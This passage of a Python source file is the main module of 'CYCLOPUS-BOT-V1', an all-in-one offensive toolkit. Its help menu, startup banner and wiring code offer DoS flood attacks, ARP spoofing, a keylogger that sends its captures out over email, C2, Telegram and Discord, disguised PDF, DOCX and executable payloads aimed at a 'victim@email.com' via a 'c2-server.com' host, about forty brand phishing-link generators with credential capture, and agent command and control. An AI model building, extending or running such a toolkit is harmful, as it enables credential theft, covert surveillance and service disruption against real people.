    def _clear(self, args: List[str]) -> Dict:
        os.system('cls' if os.name == 'nt' else 'clear')
        return {'success': True, 'output': ''}
    
    def _generic(self, command: str) -> Dict:
        try:
            result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=60)
            return {'success': result.returncode == 0, 'output': result.stdout if result.stdout else result.stderr}
        except subprocess.TimeoutExpired:
            return {'success': False, 'output': 'Command timed out'}
        except Exception as e:
            return {'success': False, 'output': str(e)}
    
    def _help(self, args: List[str]) -> Dict:
        help_text = f"""
{Colors.CYAN}╔══════════════════════════════════════════════════════════════════════════════╗
║{Colors.PURPLE}        🐙 CYCLOPUS-BOT-V1 - HELP MENU                                   {Colors.CYAN}║
╠══════════════════════════════════════════════════════════════════════════════╣
║{Colors.BLUE}                                                                           {Colors.CYAN}║
║{Colors.GREEN}📡 NETWORK COMMANDS:{Colors.RESET}
║  ping <target> [count]         - Ping a target
║  ping6 <target>                - IPv6 ping
║  ping_sweep <network>          - Ping sweep entire network
║  fping <targets...>            - Fast ping multiple targets
║  traceroute <target>           - Trace network path
║  whois <domain>                - WHOIS lookup
║  dns <domain> [type]           - DNS lookup
║  dig <domain>                  - Dig DNS lookup
║  nslookup <domain>             - NSLookup
║  host <domain>                 - Host lookup
║  location <ip>                 - IP geolocation
║
║{Colors.GREEN}🔍 NMAP COMMANDS:{Colors.RESET}
║  nmap <target> [options]       - Run nmap scan
║  nmap_quick <target>           - Quick port scan
║  nmap_full <target>            - Full port scan (all ports)
║  nmap_os <target>              - OS detection scan
║  nmap_service <target>         - Service version detection
║  nmap_udp <target>             - UDP port scan
║  nmap_vuln <target>            - Vulnerability scan
║  nmap_stealth <target>         - Stealth SYN scan
║  nmap_scan <target> <ports>    - Scan specific ports
║  nmap_ping <target>            - Ping scan
║
║{Colors.GREEN}⬇️ WGET COMMANDS:{Colors.RESET}
║  wget <url> [output]           - Download file
║  wget_file <url> <filename>    - Download to specific file
║  wget_recursive <url>          - Recursive download
║
║{Colors.GREEN}🌐 CURL COMMANDS:{Colors.RESET}
║  curl <url>                    - HTTP request
║  curl_get <url>                - GET request
║  curl_post <url> <data>        - POST request
║  curl_head <url>               - HEAD request
║  curl_options <url>            - OPTIONS request
║
║{Colors.GREEN}🔌 NETCAT COMMANDS:{Colors.RESET}
║  netcat <host> <port> [cmd]    - Connect to host/port
║  nc_listen <port>              - Listen on port
║  nc_scan <host> <ports>        - Port scan with netcat
║
║{Colors.GREEN}🔒 SSH COMMANDS:{Colors.RESET}
║  ssh_add <name> <host> <user> [pass] - Add SSH connection
║  ssh_list                      - List SSH connections
║  ssh_connect <conn_id>         - Connect to server
║  ssh_exec <conn_id> <command>  - Execute command
║  ssh_disconnect <conn_id>      - Disconnect
║
║{Colors.GREEN}🚀 TRAFFIC GENERATION:{Colors.RESET}
║  traffic <type> <ip> <duration> [port] [rate] - Generate traffic
║  traffic_types                 - List available types
║  traffic_status                - Show active generators
║  traffic_stop [id]             - Stop generation
║
║{Colors.GREEN}🕷️ NIKTO COMMANDS:{Colors.RESET}
║  nikto <target>                - Web vulnerability scan
║  nikto_full <target>           - Full scan with all tests
║  nikto_ssl <target>            - SSL/TLS scan
║
║{Colors.GREEN}💥 DOS ATTACKS:{Colors.RESET}
║  dos_syn <ip> <port> <duration> [threads] - SYN flood attack
║  dos_udp <ip> <port> <duration> [threads] - UDP flood attack
║  dos_http <ip> <port> <duration> [threads] - HTTP flood attack
║  dos_icmp <ip> <duration> [threads] - ICMP flood attack
║  dos_stop [id]                - Stop DOS attack
║  dos_status                    - Show active attacks
║
║{Colors.GREEN}🔓 CRACKING COMMANDS:{Colors.RESET}
║  crack <hash_type> <hash> [wordlist] - Start cracking job
║  crack_status <job_id>         - Check job status
║  crack_list                    - List all jobs
║
║{Colors.GREEN}🕸️ ARP SPOOFING:{Colors.RESET}
║  arp_spoof <target> <gateway> [interface] - Start ARP spoofing
║  arp_stop [id]                - Stop ARP spoofing
║  arp_status                    - Show active spoofs
║  arp_history [limit]           - Show spoof history
║
║{Colors.GREEN}📡 MAC COMMANDS:{Colors.RESET}
║  mac_info <mac>                - Get MAC address info
║  mac_scan [network]            - Scan network for MACs
║  mac_vendor <mac>              - Get MAC vendor
║
║{Colors.GREEN}🌐 NAT COMMANDS:{Colors.RESET}
║  nat_info                      - Show NAT information
║  nat_public                    - Show public IP
║  nat_private                   - Show private IP
║
║{Colors.GREEN}🐳 DOCKER COMMANDS:{Colors.RESET}
║  docker_scan <image>           - Scan Docker image
║  docker_info                   - Docker info
║  docker_ps                     - Running containers
║  docker_images                 - List images
║  docker_bench                  - Docker Bench Security
║
║{Colors.GREEN}📧 EMAIL COMMANDS:{Colors.RESET}
║  email_compose <to> <subject> <body> - Compose email
║  email_send <email_id>         - Send email
║  email_list [status]           - List emails
║  email_delete <email_id>       - Delete email
║
║{Colors.GREEN}📊 PDF REPORT COMMANDS:{Colors.RESET}
║  report_generate <title> <target> - Generate PDF report
║  report_list                   - List PDF reports
║
║{Colors.GREEN}🤖 AGENT COMMANDS:{Colors.RESET}
║  agent_register <name> <ip>    - Register new agent
║  agent_command <id> <command>  - Send command to agent
║  agent_list                    - List all agents
║  agent_status <id>            - Check agent status
║
║{Colors.GREEN}📡 NETWORK MONITOR:{Colors.RESET}
║  netmon_start                  - Start network monitoring
║  netmon_stop                   - Stop network monitoring
║  netmon_status                 - Show monitoring status
║  netmon_packets [limit]        - Show captured packets
║
║{Colors.GREEN}⌨️ ADVANCED KEYLOGGER:{Colors.RESET}
║  keylogger_start               - Start keylogger (F10 to stop)
║  keylogger_stop                - Stop keylogger
║  keylogger_status              - Check keylogger status
║  keylogger_logs [limit]        - View captured keylogs
║  keylogger_screenshots         - View captured screenshots
║  keylogger_clipboard [limit]   - View clipboard history
║
║{Colors.GREEN}📦 DEPLOYMENT ENGINE:{Colors.RESET}
║  deploy_pdf <name> <target> <url> - Create PDF with keylogger link
║  deploy_email <name> <target> <subject> <body> <url> - Create email payload
║  deploy_link <name> <target> <url> - Create direct link payload
║  deploy_executable <name> <target> <server> - Create executable payload
║  deploy_docx <name> <target> <url> - Create DOCX payload
║  deploy_list                  - List all deployments
║  deploy_track <id>            - Track deployment open
║
║{Colors.GREEN}🎣 SOCIAL ENGINEERING:{Colors.RESET}
║  phish_facebook                - Generate Facebook phishing link
║  phish_instagram               - Generate Instagram phishing link
║  phish_twitter                 - Generate Twitter phishing link
║  phish_gmail                   - Generate Gmail phishing link
║  phish_linkedin                - Generate LinkedIn phishing link
║  phish_microsoft               - Generate Microsoft phishing link
║  phish_google                  - Generate Google phishing link
║  phish_apple                   - Generate Apple phishing link
║  phish_paypal                  - Generate PayPal phishing link
║  phish_amazon                  - Generate Amazon phishing link
║  phish_netflix                 - Generate Netflix phishing link
║  phish_spotify                 - Generate Spotify phishing link
║  phish_whatsapp                - Generate WhatsApp phishing link
║  phish_telegram                - Generate Telegram phishing link
║  phish_discord                 - Generate Discord phishing link
║  phish_github                  - Generate GitHub phishing link
║  phish_slack                   - Generate Slack phishing link
║  phish_zoom                    - Generate Zoom phishing link
║  phish_teams                   - Generate Teams phishing link
║  phish_dropbox                 - Generate Dropbox phishing link
║  phish_adobe                   - Generate Adobe phishing link
║  phish_steam                   - Generate Steam phishing link
║  phish_roblox                  - Generate Roblox phishing link
║  phish_twitch                  - Generate Twitch phishing link
║  phish_xbox                    - Generate Xbox phishing link
║  phish_playstation             - Generate PlayStation phishing link
║  phish_cashapp                 - Generate Cash App phishing link
║  phish_venmo                   - Generate Venmo phishing link
║  phish_chase                   - Generate Chase phishing link
║  phish_wellsfargo              - Generate Wells Fargo phishing link
║  phish_office365               - Generate Office 365 phishing link
║  phish_onedrive                - Generate OneDrive phishing link
║  phish_icloud                  - Generate iCloud phishing link
║  phish_pinterest               - Generate Pinterest phishing link
║  phish_reddit                  - Generate Reddit phishing link
║  phish_snapchat                - Generate Snapchat phishing link
║  phish_tiktok                  - Generate TikTok phishing link
║  phish_tinder                  - Generate Tinder phishing link
║  phish_bumble                  - Generate Bumble phishing link
║  phish_custom                  - Generate Custom phishing link
║  phish_start <link_id> [port]  - Start phishing server
║  phish_stop                    - Stop phishing server
║  phish_creds [link_id]         - View captured credentials
║  list_templates                - List all phishing templates
║  view_template <name>          - View a phishing template
║  edit_template <name> <file>   - Edit a phishing template
║  create_template <name> <file> - Create a custom phishing template
║  delete_template <name>        - Delete a phishing template
║
║{Colors.GREEN}🛡️ NETWORK COMMANDS:{Colors.RESET}
║  scan <target>                 - Quick port scan
║  quick_scan <target>           - Quick port scan
║  full_scan <target>            - Full port scan
║
║{Colors.GREEN}🔒 IP MANAGEMENT:{Colors.RESET}
║  add_ip <ip> [notes]           - Add IP to monitoring
║  remove_ip <ip>                - Remove IP from monitoring
║  block_ip <ip> [reason]        - Block IP via firewall
║  unblock_ip <ip>               - Unblock IP
║  list_ips [active]             - List managed IPs
║  ip_info <ip>                  - Detailed IP information
║  analyze_ip <ip>               - Complete IP analysis
║
║{Colors.GREEN}📱 PLATFORM COMMANDS:{Colors.RESET}
║  platform_send <platform> <cmd> - Send command to platform
║  platform_status               - Show platform status
║  platform_results [limit]      - Show platform results
║
║{Colors.GREEN}🎬 ANIMATION COMMANDS:{Colors.RESET}
║  anim_spinner [duration] [msg] - Show spinner animation
║  anim_matrix [duration]        - Show matrix rain animation
║  anim_pulse [duration] [text]  - Show pulse animation
║  anim_wave [duration] [text]   - Show wave animation
║  anim_glitch [duration] [text] - Show glitch animation
║  anim_octopus [duration]       - Show octopus swim animation
║
║{Colors.GREEN}📊 SYSTEM COMMANDS:{Colors.RESET}
║  status                        - System status
║  history [limit]               - Command history
║  system                        - System information
║  threats [limit]               - Recent threats
║  report                        - Security report
║  clear                         - Clear screen
║  help                          - This help menu
║
║{Colors.PURPLE}💡 EXAMPLES:{Colors.RESET}
║  ping 8.8.8.8
║  nmap_quick 192.168.1.1
║  wget https://example.com/file.txt
║  curl https://example.com
║  traffic icmp 192.168.1.1 10
║  nikto example.com
║  dos_syn 192.168.1.100 80 30 100
║  crack md5 5f4dcc3b5aa765d61d8327deb882cf99
║  arp_spoof 192.168.1.100 192.168.1.1
║  mac_info 00:11:22:33:44:55
║  nat_info
║  keylogger_start
║  anim_matrix 3
║  docker_scan alpine:latest
║  email_compose "user@example.com" "Hello" "This is a test email"
║  report_generate "Security Report" "127.0.0.1"
║  platform_send discord "ping 127.0.0.1"
║  deploy_pdf "Invoice" "victim@email.com" "http://c2-server.com/keylog"
║  deploy_link "Update" "user@email.com" "http://c2-server.com/download"
║  phish_facebook
║  add_ip 192.168.1.100 Suspicious
║  analyze_ip 127.0.0.1
║  list_templates
║  view_template facebook
║  create_template my_template my_custom.html
║
║{Colors.PURPLE}⚠️  For authorized security testing only{Colors.RESET}
╚══════════════════════════════════════════════════════════════════════════════╝
"""
        return {'success': True, 'output': help_text}

# =====================
# MAIN APPLICATION
# =====================
class CyclopusBotV1:
    def __init__(self):
        self.config = ConfigManager()
        self.db = DatabaseManager()
        self.ssh = SSHManager(self.db) if PARAMIKO_AVAILABLE else None
        self.traffic = TrafficGeneratorEngine(self.db) if SCAPY_AVAILABLE else None
        self.nikto = NiktoScanner(self.db)
        self.dos = DOSEngine(self.db, self.config)
        self.spear = SpearPhishingEngine(self.db, self.config)
        self.agent = AgentEngine(self.db, self.config)
        self.network_monitor = NetworkMonitor(self.db, self.config)
        self.keylogger = KeyloggerEngine(self.db, self.config) if PYNPUT_AVAILABLE else None
        self.deployment = DeploymentEngine(self.db, self.config)
        self.cracking = CrackingEngine(self.db, self.config)
        self.arp_spoofing = ARPSpoofingEngine(self.db, self.config) if SCAPY_AVAILABLE else None
        self.mac_manager = MACManager(self.db)
        self.nat_info = NATInfoEngine(self.db)
        self.docker_scanner = DockerScanner(self.db)
        self.social = SocialEngineeringTools(self.db)
        self.email_composer = EmailComposerEngine(self.db, self.config)
        self.pdf_report = PDFReportGenerator(self.db, self.config)
        
        # Platform bots
        self.discord = DiscordBot(None, self.db)
        self.telegram = TelegramBot(None, self.db)
        self.slack = SlackBot(None, self.db)
        self.signal = SignalBot(None, self.db)
        self.imessage = iMessageBot(None, self.db)
        self.google_chat = GoogleChatBot(None, self.db)
        self.whatsapp = WhatsAppBot(None, self.db)
        
        # Platform executor
        self.platform_executor = PlatformCommandExecutor(None, self.config)
        self.platform_executor.db = self.db
        
        # Set up handlers
        self.handler = CommandHandler(
            self.db, self.ssh, self.traffic, self.nikto,
            self.dos, self.spear, self.agent, self.network_monitor,
            self.keylogger, self.deployment, self.cracking,
            self.arp_spoofing, self.mac_manager, self.nat_info,
            self.platform_executor, self.email_composer, self.pdf_report,
            self.docker_scanner, self.social
        )
        
        # Connect bots to handler
        self.discord.handler = self.handler
        self.telegram.handler = self.handler
        self.slack.handler = self.handler
        self.signal.handler = self.handler
        self.imessage.handler = self.handler
        self.google_chat.handler = self.handler
        self.whatsapp.handler = self.handler
        
        # Connect platform executor
        self.platform_executor.handler = self.handler
        
        # Connect keylogger to bots
        if self.keylogger:
            self.keylogger.telegram_bot = self.telegram
            self.keylogger.discord_bot = self.discord
        
        self.web = WebDashboard(self.handler, self.db, self.config)
        self.session_id = str(uuid.uuid4())[:8]
        self.running = True
    
    def print_banner(self):
        banner = f"""
{Colors.CYAN}╔══════════════════════════════════════════════════════════════════════════════╗
║{Colors.PURPLE}        🐙 CYCLOPUS-BOT-V1 - Ultimate Cybersecurity Platform          {Colors.CYAN}║
╠══════════════════════════════════════════════════════════════════════════════╣
║{Colors.BLUE}                                                                           {Colors.CYAN}║
║{Colors.GREEN}  • 🐙 100+ Security Commands       • 📡 Ping / Nmap / Curl / Netcat{Colors.CYAN}║
║{Colors.GREEN}  • 🔌 SSH Remote Command Execution    • 🚀 REAL Traffic Generation    {Colors.CYAN}║
║{Colors.GREEN}  • 🕷️ Nikto Web Vulnerability Scanner  • 🎣 Social Engineering Suite   {Colors.CYAN}║
║{Colors.GREEN}  • ⌨️ Advanced Keylogger (F10)         • 💥 DOS Attack Capabilities    {Colors.CYAN}║
║{Colors.GREEN}  • 📧 Spear Phishing Campaigns        • 🤖 Agent Command & Control    {Colors.CYAN}║
║{Colors.GREEN}  • 📱 Multi-Platform Bot Integration  • 💻 Web Dashboard              {Colors.CYAN}║
║{Colors.GREEN}  • Discord | Telegram | Slack         • Signal | iMessage | WhatsApp  {Colors.CYAN}║
║{Colors.GREEN}  • Google Chat | Web Dashboard        • 🕸️ ARP Spoofing & MAC Mgmt    {Colors.CYAN}║
║{Colors.GREEN}  • 🔒 IP Management & Threat Detection • 🌐 NAT Information            {Colors.CYAN}║
║{Colors.GREEN}  • 🔓 Password Cracking Engine        • 🐳 Docker Security Scanning   {Colors.CYAN}║
║{Colors.GREEN}  • 📧 Email Composition & Sending     • 📊 PDF Report Generation      {Colors.CYAN}║
║{Colors.GREEN}  • 🎬 Terminal Animations             • 📱 Cross-Platform Execution   {Colors.CYAN}║
║{Colors.GREEN}  • 🎣 100+ Phishing Templates         • ✏️ Template Editor            {Colors.CYAN}║
╠══════════════════════════════════════════════════════════════════════════════╣
║{Colors.PURPLE}                    🎯 ACCURATE CYBER DEFENSE                                                        {Colors.CYAN}║
╚══════════════════════════════════════════════════════════════════════════════╝{Colors.RESET}

{Colors.CYAN}🐙 Welcome to CYCLOPUS-BOT-V1 - Your Ultimate Security Assistant{Colors.RESET}
{Colors.CYAN}💡 Type 'help' to see all commands{Colors.RESET}
{Colors.CYAN}⌨️ Press F10 to start/stop the keylogger{Colors.RESET}
{Colors.CYAN}🌐 Web dashboard available at http://localhost:5000 (if enabled){Colors.RESET}
{Colors.CYAN}📧 Use 'email_compose' to compose and send emails{Colors.RESET}
{Colors.CYAN}📊 Use 'report_generate' to generate PDF reports{Colors.RESET}
{Colors.CYAN}🔓 Use 'crack' commands for password cracking{Colors.RESET}
{Colors.CYAN}🕸️ Use 'arp_spoof' for ARP spoofing attacks{Colors.RESET}
{Colors.CYAN}📡 Use 'mac_info' for MAC address information{Colors.RESET}
{Colors.CYAN}🌐 Use 'nat_info' for NAT information{Colors.RESET}
{Colors.CYAN}🎬 Use 'anim_*' for terminal animations{Colors.RESET}
{Colors.CYAN}📱 Use 'platform_send' for cross-platform commands{Colors.RESET}
{Colors.CYAN}🎣 Use 'list_templates' to view phishing templates{Colors.RESET}
{Colors.CYAN}✏️ Use 'edit_template' or 'create_template' to modify templates{Colors.RESET}
        """
        print(banner)
    
    def check_dependencies(self):
        print(f"\n{Colors.CYAN}🔍 Checking dependencies...{Colors.RESET}")
        
        tools = ['ping', 'nmap', 'curl', 'nc', 'dig', 'traceroute', 'ssh', 'wget', 'docker', 'hashcat', 'nikto']
        for tool in tools:
            if shutil.which(tool):
                print(f"{Colors.GREEN}✅ {tool}{Colors.RESET}")
            else:
                print(f"{Colors.YELLOW}⚠️ {tool} not found{Colors.RESET}")
        
        print(f"{Colors.GREEN if PARAMIKO_AVAILABLE else Colors.YELLOW}✅ paramiko{Colors.RESET}" if PARAMIKO_AVAILABLE else f"{Colors.YELLOW}⚠️ paramiko not found - SSH disabled{Colors.RESET}")
        print(f"{Colors.GREEN if SCAPY_AVAILABLE else Colors.YELLOW}✅ scapy{Colors.RESET}" if SCAPY_AVAILABLE else f"{Colors.YELLOW}⚠️ scapy not found - advanced features disabled{Colors.RESET}")
        print(f"{Colors.GREEN if DISCORD_AVAILABLE else Colors.YELLOW}✅ discord.py{Colors.RESET}" if DISCORD_AVAILABLE else f"{Colors.YELLOW}⚠️ discord.py not found - Discord disabled{Colors.RESET}")
        print(f"{Colors.GREEN if SLACK_AVAILABLE else Colors.YELLOW}✅ slack-sdk{Colors.RESET}" if SLACK_AVAILABLE else f"{Colors.YELLOW}⚠️ slack-sdk not found - Slack disabled{Colors.RESET}")
        print(f"{Colors.GREEN if WEB_AVAILABLE else Colors.YELLOW}✅ flask{Colors.RESET}" if WEB_AVAILABLE else f"{Colors.YELLOW}⚠️ flask not found - Web dashboard disabled{Colors.RESET}")
        print(f"{Colors.GREEN if PYNPUT_AVAILABLE else Colors.YELLOW}✅ pynput{Colors.RESET}" if PYNPUT_AVAILABLE else f"{Colors.YELLOW}⚠️ pynput not found - Keylogger disabled{Colors.RESET}")
        print(f"{Colors.GREEN if DNS_AVAILABLE else Colors.YELLOW}✅ dnspython{Colors.RESET}" if DNS_AVAILABLE else f"{Colors.YELLOW}⚠️ dnspython not found - DNS features limited{Colors.RESET}")
        print(f"{Colors.GREEN if PDF_AVAILABLE else Colors.YELLOW}✅ reportlab{Colors.RESET}" if PDF_AVAILABLE else f"{Colors.YELLOW}⚠️ reportlab not found - PDF reports disabled{Colors.RESET}")
        
        if shutil.which('signal-cli'):
            print(f"{Colors.GREEN}✅ signal-cli{Colors.RESET}")
        else:
            print(f"{Colors.YELLOW}⚠️ signal-cli not found - Signal disabled{Colors.RESET}")
    
    def setup_platforms(self):
        print(f"\n{Colors.CYAN}🤖 Platform Bot Configuration{Colors.RESET}")
        print(f"{Colors.CYAN}{'='*50}{Colors.RESET}")
        
        # Discord
        setup = input(f"{Colors.PURPLE}Configure Discord bot? (y/n): {Colors.RESET}").strip().lower()
        if setup == 'y':
            token = input(f"{Colors.PURPLE}Enter Discord bot token: {Colors.RESET}").strip()
            channel = input(f"{Colors.PURPLE}Enter channel ID: {Colors.RESET}").strip()
            prefix = input(f"{Colors.PURPLE}Enter command prefix (default: !): {Colors.RESET}").strip() or '!'
            if token:
                self.discord.save_config(token, True, prefix)
                self.discord.config['channel_id'] = channel
                if self.discord.setup():
                    self.discord.start()
                    self.platform_executor.register_platform('discord', self.discord)
                    print(f"{Colors.GREEN}✅ Discord bot starting...{Colors.RESET}")
        
        # Telegram
        setup = input(f"{Colors.PURPLE}Configure Telegram bot? (y/n): {Colors.RESET}").strip().lower()
        if setup == 'y':
            token = input(f"{Colors.PURPLE}Enter Telegram bot token: {Colors.RESET}").strip()
            chat_id = input(f"{Colors.PURPLE}Enter chat ID: {Colors.RESET}").strip()
            prefix = input(f"{Colors.PURPLE}Enter command prefix (default: /): {Colors.RESET}").strip() or '/'
            if token:
                self.telegram.save_config(token, chat_id, True, prefix)
                self.telegram.start()
                self.platform_executor.register_platform('telegram', self.telegram)
                print(f"{Colors.GREEN}✅ Telegram bot starting...{Colors.RESET}")
        
        # Slack
        setup = input(f"{Colors.PURPLE}Configure Slack bot? (y/n): {Colors.RESET}").strip().lower()
        if setup == 'y':
            token = input(f"{Colors.PURPLE}Enter Slack bot token: {Colors.RESET}").strip()
            channel = input(f"{Colors.PURPLE}Enter channel ID: {Colors.RESET}").strip()
            prefix = input(f"{Colors.PURPLE}Enter command prefix (default: !): {Colors.RESET}").strip() or '!'
            if token:
                self.slack.save_config(token, channel, True, prefix)
                if self.slack.setup():
                    self.slack.start()
                    self.platform_executor.register_platform('slack', self.slack)
                    print(f"{Colors.GREEN}✅ Slack bot starting...{Colors.RESET}")
        
        # Signal
        setup = input(f"{Colors.PURPLE}Configure Signal bot? (y/n): {Colors.RESET}").strip().lower()
        if setup == 'y':
            phone = input(f"{Colors.PURPLE}Enter phone number: {Colors.RESET}").strip()
            group = input(f"{Colors.PURPLE}Enter group ID (optional): {Colors.RESET}").strip()
            prefix = input(f"{Colors.PURPLE}Enter command prefix (default: !): {Colors.RESET}").strip() or '!'
            if phone:
                self.signal.save_config(phone, group, True, prefix)
                self.signal.start()
                self.platform_executor.register_platform('signal', self.signal)
                print(f"{Colors.GREEN}✅ Signal bot starting...{Colors.RESET}")
        
        # Google Chat
        setup = input(f"{Colors.PURPLE}Configure Google Chat bot? (y/n): {Colors.RESET}").strip().lower()
        if setup == 'y':
            webhook = input(f"{Colors.PURPLE}Enter Google Chat webhook URL: {Colors.RESET}").strip()
            prefix = input(f"{Colors.PURPLE}Enter command prefix (default: /): {Colors.RESET}").strip() or '/'
            if webhook:
                self.google_chat.save_config(webhook, "", True, prefix)
                self.google_chat.start()
                self.platform_executor.register_platform('google_chat', self.google_chat)
                print(f"{Colors.GREEN}✅ Google Chat bot configured...{Colors.RESET}")
        
        # WhatsApp
        setup = input(f"{Colors.PURPLE}Configure WhatsApp bot? (y/n): {Colors.RESET}").strip().lower()
        if setup == 'y':
            phone = input(f"{Colors.PURPLE}Enter WhatsApp phone number: {Colors.RESET}").strip()
            prefix = input(f"{Colors.PURPLE}Enter command prefix (default: !): {Colors.RESET}").strip() or '!'
            if phone:
                self.whatsapp.save_config(phone, True, prefix)
                self.whatsapp.start()
                self.platform_executor.register_platform('whatsapp', self.whatsapp)
                print(f"{Colors.GREEN}✅ WhatsApp bot configured...{Colors.RESET}")
        
        # iMessage (macOS only)
        if platform.system() == 'Darwin':
            setup = input(f"{Colors.PURPLE}Configure iMessage bot? (y/n): {Colors.RESET}").strip().lower()
            if setup == 'y':
                numbers = input(f"{Colors.PURPLE}Enter phone numbers to watch (space-separated): {Colors.RESET}").strip().split()
                prefix = input(f"{Colors.PURPLE}Enter command prefix (default: !): {Colors.RESET}").strip() or '!'
                if numbers:
                    self.imessage.save_config(numbers, True, prefix)
                    self.imessage.start()
                    self.platform_executor.register_platform('imessage', self.imessage)
                    print(f"{Colors.GREEN}✅ iMessage bot starting...{Colors.RESET}")
        
        # Start platform processor
        self.platform_executor.start_processor()
        
        # Web Dashboard
        setup = input(f"{Colors.PURPLE}Enable Web Dashboard? (y/n): {Colors.RESET}").strip().lower()
        if setup == 'y':
            port = input(f"{Colors.PURPLE}Enter port (default: 5000): {Colors.RESET}").strip() or '5000'
            host = input(f"{Colors.PURPLE}Enter host (default: 0.0.0.0): {Colors.RESET}").strip() or '0.0.0.0'
            self.config.set('web.enabled', True)
            self.config.set('web.port', int(port))
            self.config.set('web.host', host)
            self.config.save()
            self.web.start()
            print(f"{Colors.GREEN}✅ Web dashboard starting...{Colors.RESET}")
        
        # Keylogger
        setup = input(f"{Colors.PURPLE}Enable keylogger? (y/n): {Colors.RESET}").strip().lower()
        if setup == 'y':
            if self.keylogger:
                self.config.set('keylogger.enabled', True)
                self.config.set('keylogger.exfil_methods', ['file', 'email', 'c2', 'telegram', 'discord'])
                self.config.save()
                print(f"{Colors.GREEN}✅ Keylogger configured. Press F10 to start/stop.{Colors.RESET}")
                print(f"{Colors.CYAN}  • Exfiltration methods: file, email, c2, telegram, discord{Colors.RESET}")
                print(f"{Colors.CYAN}  • Screenshot interval: {self.config.get('keylogger.screenshot_interval', 60)}s{Colors.RESET}")
                print(f"{Colors.CYAN}  • Upload interval: {self.config.get('keylogger.upload_interval', 30)}s{Colors.RESET}")
            else:
                print(f"{Colors.YELLOW}⚠️ Keylogger not available (pynput missing){Colors.RESET}")
    
    def run(self):
        os.system('cls' if os.name == 'nt' else 'clear')
        
        # Show startup animations
        TerminalAnimation.matrix_rain(2.0)
        TerminalAnimation.pulse_animation("🐙 CYCLOPUS-BOT-V1", 2.0)
        TerminalAnimation.octopus_swim(2.0)
        
        self.print_banner()
        self.check_dependencies()
        
        auto_monitor = input(f"\n{Colors.PURPLE}Start network monitoring? (y/n): {Colors.RESET}").strip().lower()
        if auto_monitor == 'y':
            self.network_monitor.start()
            print(f"{Colors.GREEN}✅ Network monitoring started{Colors.RESET}")
        
        setup_platforms = input(f"{Colors.PURPLE}Configure platform integrations? (y/n): {Colors.RESET}").strip().lower()
        if setup_platforms == 'y':
            self.setup_platforms()
        
        # Show final status
        TerminalAnimation.wave_animation("🐙 CYCLOPUS-BOT-V1 READY", 2.0)
        
        print(f"\n{Colors.GREEN}✅ CYCLOPUS-BOT-V1 ready! Session: {self.session_id}{Colors.RESET}")
        print(f"{Colors.CYAN}   Type 'help' for commands, 'deploy_*' for payload deployment{Colors.RESET}")
        print(f"{Colors.CYAN}   ⌨️ Press F10 to start/stop the keylogger{Colors.RESET}")
        print(f"{Colors.CYAN}   🔓 Use 'crack' commands for password cracking{Colors.RESET}")
        print(f"{Colors.CYAN}   🕸️ Use 'arp_spoof' for ARP spoofing attacks{Colors.RESET}")
        print(f"{Colors.CYAN}   📡 Use 'mac_info' for MAC address information{Colors.RESET}")
        print(f"{Colors.CYAN}   🌐 Use 'nat_info' for NAT information{Colors.RESET}")
        print(f"{Colors.CYAN}   🎬 Use 'anim_*' for terminal animations{Colors.RESET}")
        print(f"{Colors.CYAN}   📱 Use 'platform_send' for cross-platform commands{Colors.RESET}")
        print(f"{Colors.CYAN}   📧 Use 'email_compose' to compose and send emails{Colors.RESET}")
        print(f"{Colors.CYAN}   📊 Use 'report_generate' to generate PDF reports{Colors.RESET}")
        print(f"{Colors.CYAN}   🎣 Use 'list_templates' to view phishing templates{Colors.RESET}")
        
        while self.running:
            try:
                prompt = f"{Colors.CYAN}[{Colors.PURPLE}{self.session_id}{Colors.CYAN}]{Colors.WHITE} 🐙> {Colors.RESET}"
                command = input(prompt).strip()
                
                if not command:
                    continue
                
                if command.lower() == 'exit' or command.lower() == 'quit':
                    self.running = False
                    print(f"\n{Colors.YELLOW}👋 Goodbye!{Colors.RESET}")
                    break
                
                result = self.handler.execute(command)
                
                if result['success']:
                    output = result.get('output', '')
                    if output:
                        print(output)
                    print(f"\n{Colors.GREEN}✅ Done ({result['execution_time']:.2f}s){Colors.RESET}")
                else:
                    print(f"\n{Colors.RED}❌ {result.get('output', 'Unknown error')}{Colors.RESET}")
                    
            except KeyboardInterrupt:
                print(f"\n{Colors.YELLOW}👋 Exiting...{Colors.RESET}")
                self.running = False
            except Exception as e:
                print(f"{Colors.RED}❌ Error: {e}{Colors.RESET}")
                logger.error(f"Command error: {e}")
        
        # Cleanup
        if self.keylogger and self.keylogger.running:
            self.keylogger.stop()
        self.network_monitor.stop()
        self.agent.stop_heartbeat()
        self.platform_executor.stop_processor()
        self.db.close()
        print(f"\n{Colors.GREEN}✅ Shutdown complete.{Colors.RESET}")
        print(f"{Colors.CYAN}📁 Logs: {LOG_FILE}{Colors.RESET}")
        print(f"{Colors.CYAN}💾 Database: {DATABASE_FILE}{Colors.RESET}")
        print(f"{Colors.CYAN}📊 Reports: {PDF_REPORTS_DIR}{Colors.RESET}")

# =====================
# MAIN ENTRY POINT
# =====================
def main():
    try:
        print(f"{Colors.CYAN}🐙 Starting CYCLOPUS-BOT-V1...{Colors.RESET}")
        
        if sys.version_info < (3, 7):
            print(f"{Colors.RED}❌ Python 3.7+ required{Colors.RESET}")
            sys.exit(1)
        
        needs_admin = False
        if platform.system().lower() == 'linux' and os.geteuid() != 0:
            needs_admin = True
        elif platform.system().lower() == 'windows':
            try:
                import ctypes
                if not ctypes.windll.shell32.IsUserAnAdmin():
                    needs_admin = True
            except:
                pass
        
        if needs_admin:
            print(f"{Colors.YELLOW}⚠️ Run with sudo/admin for full functionality (firewall, raw sockets){Colors.RESET}")
        
        app = CyclopusBotV1()
        app.run()
        
    except KeyboardInterrupt:
        print(f"\n{Colors.YELLOW}👋 Goodbye!{Colors.RESET}")
    except Exception as e:
        print(f"\n{Colors.RED}❌ Fatal error: {e}{Colors.RESET}")
        import traceback
        traceback.print_exc()
        sys.exit(1)

if __name__ == "__main__":
    main()
